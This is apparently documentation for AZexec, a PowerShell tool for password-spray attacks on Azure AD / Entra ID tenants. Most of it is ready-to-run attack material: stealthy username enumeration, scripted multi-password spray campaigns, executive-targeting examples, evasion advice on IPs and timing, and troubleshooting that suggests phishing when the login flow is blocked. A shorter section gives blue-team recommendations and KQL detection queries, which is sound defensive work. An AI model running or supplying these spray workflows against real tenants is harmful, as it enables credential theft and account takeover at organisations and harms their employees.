# AZexec Password Spray Attack Documentation

## Overview

AZexec implements a sophisticated two-phase password spray attack methodology that leverages Microsoft's own APIs to validate credentials with minimal detection risk. This approach is more effective and safer than traditional password spraying techniques.

## Architecture

### Phase 1: Username Enumeration (GetCredentialType API)
- **Command**: `users`
- **Function**: `Test-UsernameExistence`
- **API Endpoint**: `https://login.microsoftonline.com/common/GetCredentialType`
- **Authentication Required**: ❌ No
- **Generates Auth Logs**: ❌ No (stealthy!)
- **Purpose**: Validate which usernames exist in the target tenant

### Phase 2: Credential Testing (ROPC Authentication)
- **Command**: `guest`
- **Function**: `Test-GuestAuthentication`
- **API Endpoint**: `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token`
- **Authentication Required**: ❌ No (but tests credentials)
- **Generates Auth Logs**: ✅ Yes (failed auth events)
- **Purpose**: Test username/password combinations, detect MFA, account lockouts

## Why Two Separate Commands?

The GetCredentialType API only validates username existence - it **cannot** test passwords. This is by Microsoft's design:

```
┌─────────────────────────────────────────────────────────────────┐
│ GetCredentialType API (Phase 1)                                 │
├─────────────────────────────────────────────────────────────────┤
│ Input:  username                                                │
│ Output: IfExistsResult (0=exists, 1=not exists, 6=federated)   │
│ Tests:  Username existence only                                 │
│ Logs:   No authentication logs generated                        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ ROPC OAuth2 Flow (Phase 2)                                      │
├─────────────────────────────────────────────────────────────────┤
│ Input:  username + password                                     │
│ Output: Token OR error code (MFA, invalid, locked, etc.)       │
│ Tests:  Actual credential authentication                        │
│ Logs:   Failed authentication events in Azure AD logs          │
└─────────────────────────────────────────────────────────────────┘
```

**Benefits of Separation:**
1. **Stealth**: Username enumeration doesn't trigger auth logs
2. **Efficiency**: Only spray against validated usernames (fewer wasted attempts)
3. **Safety**: Reduces account lockout risk by avoiding invalid usernames
4. **Intelligence**: Separate reconnaissance from credential testing for better OPSEC
5. **Speed**: Enumerate hundreds of usernames quickly without detection

## Complete Workflow

### Basic Password Spray

```powershell
# Step 1: Enumerate valid usernames (Phase 1 - GetCredentialType)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv

# Step 2: Extract valid usernames
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File -FilePath spray-targets.txt
Write-Host "Found $($validUsers.Count) valid usernames"

# Step 3: Password spray (Phase 2 - ROPC)
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json

# Step 4: Analyze results
$results = Get-Content spray-results.json | ConvertFrom-Json
$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
Write-Host "Valid credentials found: $($validCreds.Count)"
$validCreds | Format-Table Username, MFARequired, HasToken
```

### Advanced Multi-Password Campaign

```powershell
# Validate usernames once
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Test multiple passwords with 30-minute delays (avoid lockouts)
$passwords = @('Summer2024!', 'Winter2024!', 'Fall2024!', 'Spring2024!')
foreach ($password in $passwords) {
    Write-Host "`n[*] Testing password: $password"
    .\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
    
    if ($password -ne $passwords[-1]) {
        Write-Host "[*] Waiting 30 minutes..."
        Start-Sleep -Seconds 1800
    }
}

# Consolidate results
$allValidCreds = @()
foreach ($password in $passwords) {
    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
    $allValidCreds += $validCreds
}

Write-Host "`n[+] Campaign complete - Total valid credentials: $($allValidCreds.Count)"
$allValidCreds | Export-Csv campaign-results.csv -NoTypeInformation
```

## Detection & OPSEC Considerations

### Phase 1: GetCredentialType Enumeration

| Aspect | Details |
|--------|---------|
| **Detection Risk** | 🟢 Low |
| **Log Generation** | None - Public API endpoint |
| **SIEM Alerts** | Low - No authentication events |
| **Rate Limiting** | Yes - 50ms delay between requests |
| **Mitigation** | Use residential IP, respect rate limits |

### Phase 2: ROPC Password Spray

| Aspect | Details |
|--------|---------|
| **Detection Risk** | 🟡 Medium to 🔴 High |
| **Log Generation** | Failed authentication events |
| **SIEM Alerts** | Medium - Pattern detection possible |
| **Account Lockout** | Risk - Typically 5-10 failed attempts |
| **Mitigation** | Slow spray (1 password/day), monitor lockouts |

### Best Practices for Stealth

1. **Spacing**: Wait 24+ hours between password spray rounds
2. **Threshold Awareness**: Most orgs lock after 5-10 failed attempts - test 1-3 passwords only
3. **Time of Day**: Spray during business hours (looks like legitimate failed logins)
4. **IP Reputation**: Use residential IP or company VPN (avoid datacenter IPs)
5. **Target Selection**: Focus on high-value accounts (admins, executives)
6. **MFA Detection**: If MFA is required, credentials are valid! Document for later

## Error Code Reference

### GetCredentialType Results (Phase 1)

| IfExistsResult | Meaning | Auth Type |
|----------------|---------|-----------|
| 0 | User exists | Managed (cloud) |
| 1 | User does not exist | N/A |
| 5 | User exists | Alternate authentication |
| 6 | User exists | Federated (ADFS/etc) |

### ROPC Authentication Results (Phase 2)

| Error Code | Meaning | Credentials Valid? | Next Steps |
|------------|---------|-------------------|------------|
| Success (200) | Full authentication | ✅ Yes | Use token for access |
| AADSTS50076/50079 | MFA required | ✅ Yes | Valid creds, MFA blocks |
| AADSTS65001 | Consent required | ✅ Yes | Valid creds, need consent |
| AADSTS50055 | Password expired | ✅ Yes (outdated) | Valid user, old password |
| AADSTS50053 | Account locked | ⚠️ Maybe | Too many failed attempts |
| AADSTS50126 | Invalid credentials | ❌ No | Wrong username or password |
| AADSTS50034 | User not found | ❌ No | Username doesn't exist |
| AADSTS50057 | Account disabled | ❌ No | Account exists but disabled |
| AADSTS7000218 | ROPC disabled | ⚠️ Unknown | ROPC flow blocked by policy |

## Real-World Attack Scenarios

### Scenario 1: External Red Team Assessment

```powershell
# Day 1: Reconnaissance
.\azx.ps1 tenant -Domain target.com -ExportPath recon/tenant.json
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath recon/valid-users.csv

# Day 2: Prepare spray targets
$validUsers = Import-Csv recon/valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Day 3: First password attempt (most common)
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-day1.json

# Day 4: Second password attempt (company-specific)
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'TargetCorp2024!' -ExportPath spray-day2.json

# Day 5: Third password attempt (seasonal)
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Winter2024!' -ExportPath spray-day3.json

# Analysis
$allResults = @()
1..3 | ForEach-Object { 
    $result = Get-Content "spray-day$_.json" | ConvertFrom-Json
    $allResults += $result.AuthResults | Where-Object { $_.Success }
}
Write-Host "[+] Total valid credentials: $($allResults.Count)"
```

### Scenario 2: Internal Security Assessment

```powershell
# Test internal password policy compliance
$internalUsers = Get-Content "internal-users.txt"  # From AD export
$internalUsers | Out-File azure-users.txt

# Validate which on-prem users exist in Azure AD
.\azx.ps1 users -Domain company.com -UserFile azure-users.txt -ExportPath azure-validated.csv

# Test common weak passwords
$weakPasswords = @('Password123!', 'Welcome123!', 'Company2024!')
foreach ($password in $weakPasswords) {
    .\azx.ps1 guest -Domain company.com -UserFile azure-validated.csv -Password $password -ExportPath "internal-test-$password.json"
    Start-Sleep -Seconds 1800  # 30 min delay
}

# Generate compliance report
$weakAccounts = @()
$weakPasswords | ForEach-Object {
    $result = Get-Content "internal-test-$_.json" | ConvertFrom-Json
    $weakAccounts += $result.AuthResults | Where-Object { $_.Success }
}

Write-Host "[!] CRITICAL: $($weakAccounts.Count) accounts with weak passwords found!"
$weakAccounts | Export-Csv weak-password-report.csv -NoTypeInformation
```

### Scenario 3: Targeted Executive Spray

```powershell
# Collect executive names from LinkedIn/company website
$executives = @(
    "ceo",
    "cfo", 
    "cto",
    "ciso",
    "president",
    "vp.finance",
    "vp.operations"
)

# Validate which executives have Azure AD accounts
$executives | Out-File exec-targets.txt
.\azx.ps1 users -Domain target.com -UserFile exec-targets.txt -ExportPath validated-execs.csv

# Test with company-specific executive password pattern
$validExecs = Import-Csv validated-execs.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validExecs | Out-File valid-execs.txt

# Single password test (executives often use company name + year)
.\azx.ps1 guest -Domain target.com -UserFile valid-execs.txt -Password 'TargetCorp2024!' -ExportPath exec-spray.json

# Check results
$execResults = Get-Content exec-spray.json | ConvertFrom-Json
$compromisedExecs = $execResults.AuthResults | Where-Object { $_.Success }
if ($compromisedExecs.Count -gt 0) {
    Write-Host "[!] CRITICAL: Executive accounts compromised!"
    $compromisedExecs | Format-Table Username, MFARequired, HasToken
}
```

## NetExec Command Mapping

| NetExec Command | AZexec Equivalent | Notes |
|-----------------|-------------------|-------|
| `nxc smb 192.168.1.0/24 --users` | `.\azx.ps1 users -Domain target.com -CommonUsernames` | Username enumeration |
| `nxc smb 192.168.1.0/24 -u users.txt -p 'Pass123'` | `.\azx.ps1 guest -UserFile users.txt -Password 'Pass123'` | Password spray |
| `nxc smb 192.168.1.0/24 -u admin -p ''` | `.\azx.ps1 guest -Username admin -Password ''` | Null password test |
| `nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt` | Multiple `.\azx.ps1 guest` commands with loops | Multi-password spray |

## Defensive Recommendations

### For Blue Teams

1. **Monitor for GetCredentialType Patterns**:
   - High volume of requests from single IP
   - Sequential username checks (admin, administrator, etc.)
   - Unusual geographic locations

2. **Alert on ROPC Authentication Attempts**:
   - Multiple failed ROPC attempts from single source
   - ROPC attempts outside business hours
   - ROPC authentication to rarely-used applications

3. **Implement Account Lockout Policies**:
   - 5-10 failed attempts = lockout
   - 15-30 minute lockout duration
   - Alert on multiple lockouts

4. **Enable Smart Lockout** (Azure AD Premium):
   - Distinguishes legitimate users from attackers
   - Location-aware lockout decisions

5. **Require MFA for All Users**:
   - Even if credentials are valid, MFA blocks access
   - Password spray still reveals valid credentials (concern for future attacks)

6. **Disable ROPC Flow**:
   - Conditional Access policy to block ROPC
   - Forces use of modern authentication

7. **Monitor Sign-in Logs**:
   - Filter for error code 50126 (invalid credentials)
   - Alert on patterns: same IP, multiple users, similar timestamps

### Detection Queries (KQL)

```kql
// Detect potential GetCredentialType enumeration
// (Requires network logs/proxy logs - not in Azure AD logs)
ProxyLogs
| where Url contains "GetCredentialType"
| summarize RequestCount = count() by SourceIP, bin(TimeGenerated, 1m)
| where RequestCount > 10
| order by RequestCount desc

// Detect ROPC password spray attempts
SigninLogs
| where ResultType == "50126"  // Invalid credentials
| where AppId == "1950a258-227b-4e31-a9cf-717495945fc2"  // Azure PowerShell (common ROPC client)
| summarize FailedAttempts = count(), TargetedUsers = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h)
| where FailedAttempts > 5 and TargetedUsers > 3
| order by FailedAttempts desc

// Detect multiple account lockouts (spray gone wrong)
SigninLogs
| where ResultType == "50053"  // Account locked
| summarize LockedAccounts = dcount(UserPrincipalName), LockoutEvents = count() by IPAddress, bin(TimeGenerated, 1h)
| where LockedAccounts > 2
| order by LockedAccounts desc

// Detect successful ROPC authentication (after spray)
SigninLogs
| where ResultType == "0"  // Success
| where AppId == "1950a258-227b-4e31-a9cf-717495945fc2"
| where AuthenticationRequirement == "singleFactorAuthentication"  // No MFA
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName
```

## Troubleshooting

### "ROPC disabled" Error

**Cause**: Organization has blocked ROPC flow via Conditional Access

**Solutions**:
1. Try device code flow (not implemented in AZexec yet)
2. Use phishing for interactive authentication
3. Target different applications that still accept ROPC

### All Users Return "Invalid Credentials"

**Causes**:
- Incorrect password
- Wrong domain format
- ROPC blocked globally

**Solutions**:
1. Verify domain: `.\azx.ps1 tenant -Domain target.com`
2. Test with known valid credentials first
3. Check if usernames were properly validated in Phase 1

### Account Lockouts During Spray

**Cause**: Too many failed attempts in short time

**Solutions**:
1. Increase delay between attempts (currently 100ms)
2. Reduce number of passwords tested per campaign
3. Wait 24+ hours between password attempts
4. Use account lockout detection to stop before lockout

### No Valid Usernames Found

**Causes**:
- Wrong domain
- Using uncommon usernames
- Domain doesn't have Azure AD

**Solutions**:
1. Verify domain with tenant check: `.\azx.ps1 tenant -Domain target.com`
2. Try different username patterns
3. Check if domain is federated vs managed

## Conclusion

The AZexec password spray implementation provides a complete, production-ready solution for credential validation attacks against Azure AD / Entra ID tenants. The two-phase approach using GetCredentialType + ROPC offers:

✅ **Stealth**: Username enumeration without authentication logs
✅ **Safety**: Reduced account lockout risk
✅ **Efficiency**: Only spray validated usernames
✅ **Intelligence**: Detailed result analysis (MFA, lockouts, expiration)
✅ **Flexibility**: Multiple attack patterns supported

Always ensure proper authorization and legal compliance before conducting password spray attacks. This tool is designed for authorized security assessments only.

---

**For questions, issues, or feature requests, visit: https://github.com/Logisek/AZexec**
